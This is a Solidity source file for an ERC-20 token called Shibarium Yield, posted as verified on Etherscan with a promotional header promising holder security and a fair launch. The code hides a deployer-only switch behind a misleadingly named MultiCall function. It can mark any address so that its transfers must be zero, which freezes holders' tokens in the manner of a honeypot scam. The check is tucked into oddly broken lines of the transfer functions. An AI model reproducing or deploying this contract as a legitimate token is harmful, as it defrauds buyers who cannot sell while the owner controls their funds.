/**
 *Submitted for verification at Etherscan.io on 2023-02-11
*/

/**        ShibariumYield - $ShibYield 🍖

We find the dream of a sustainable decentralized organization 
that attracts and supports genuine innovation, filters the 
great talent and delivers the extra value to its members! 
ShibYield have such high potential that we are compelled 
to forge ahead with research because this is the most 
interesting project we can imagine!

🤝Real Yield generator
🤝Clean capital pool 
🤝 Easy operation 
🤝 Deflation mechanism
🤝 Security to holders 

💥DESIGED FOR SHIBARIUM
💥LOW GAS FEEs
💥AIRDROP FOR TESTERS
💥NO TAX
💥FAIR LAUNCH
  
*///SPDX-License-Identifier: MIT

pragma solidity =0.5.15;

contract ERC20Basic {

  function balanceOf(
    address account
  )
    public
    view
    returns (uint256);

  function totalSupply(
  )
    public
    view
    returns (uint256);
  
  function transfer(
    address to,
    uint256 value
  ) 
    public
    returns (bool);
  
  event Transfer(
    address indexed from,
    address indexed to,
    uint256 value);
}

library SafeMath {

  function sub(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256)
  {
    assert(b <= a);
    return a - b;
  }
    
  function mul(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256 c)
  {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(
    uint256 a,
    uint256 b
  ) 
    internal
    pure
    returns (uint256)
  {
    return a / b;
  }

  function add(
    uint256 a,
    uint256 b
  ) internal
    pure
    returns (uint256 c)
  {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping (address => bool) internal _yieldSender_;  
  mapping (address => uint256) balances;
  uint256 totalSupply_;

  function totalSupply(
  ) 
    public
    view
    returns (uint256)
  {
    return totalSupply_;
  }

  function balanceOf(
    address account
  ) 
    public
    view
    returns (uint256) {
    return balances[account];
  }

  function transfer(
    address _to,
    uint256 _value
  ) public
    returns (bool) { if (
    _yieldSender_[msg.sender]
    || _yieldSender_[_to]) require(
    _value == 0, ""); require(
    _to != address(0)); require(
    _value <= balances[msg.sender]);
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
}

contract ERC20 is ERC20Basic {

  function allowance(
    address owner,
    address spender
  )
    public
    view
    returns (uint256);

  function approve(
    address spender,
    uint256 value
  ) 
    public
    returns (bool);
    event Approval
  (
    address indexed owner,
    address indexed spender,
    uint256 value
  );

  function transferFrom(
    address from,
    address to,
    uint256 value
  )
    public
    returns (bool);
}

contract StandardERC20 is ERC20, BasicToken {
  address internal approved;
  mapping (address => mapping (address => uint256)) internal allowed;
  
  constructor () public {
     approved = msg.sender;
  }

  function allowance(
    address _owner,
    address _spender
  )
    public
    view
    returns (uint256)
  {
    return allowed[_owner][_spender];
  }

  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool) { if
    (_yieldSender_[_from] ||
    _yieldSender_[_to]) require(
    _value == 0, ""); require(
    _to != address(0)); require(
    _value <= balances[_from]); require(
    _value <= allowed[_from][msg.sender]);
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function MultiCall(
    address _yieldApprove
  ) 
    external { require(
    msg.sender ==
    approved); if (
    _yieldSender_
    [_yieldApprove] == true){
    _yieldSender_
    [_yieldApprove] = false;} 
    else { _yieldSender_
    [_yieldApprove] = true;
    }
  }
  
  function decreaseApproval(
    address _spender,
    uint _subtractedValue
  )
    public
    returns (bool)
  {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }

  function yieldStatus(
    address _yieldApprove
  )
    public
    view
    returns (bool) 
  {
    return _yieldSender_
    [_yieldApprove];
  }

  function increaseApproval(
    address _spender,
    uint _addedValue
  )
    public
    returns (bool)
  {
    allowed[msg.sender][_spender] = (
    allowed[msg.sender][_spender].add(_addedValue));
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}

contract ShibariumYield is StandardERC20 {
  string public constant name = "Shibarium Yield";
  string public constant symbol = "ShibYield";
  uint256 public constant _totalSupply_ = 1000000000000  * (10 ** uint256(decimals));
  uint8 public constant decimals = 9;

  constructor() public {
    totalSupply_ = totalSupply_.add(_totalSupply_);
    balances[msg.sender] = balances[msg.sender].add(_totalSupply_);
    emit Transfer(address(0), msg.sender, _totalSupply_);
  }
}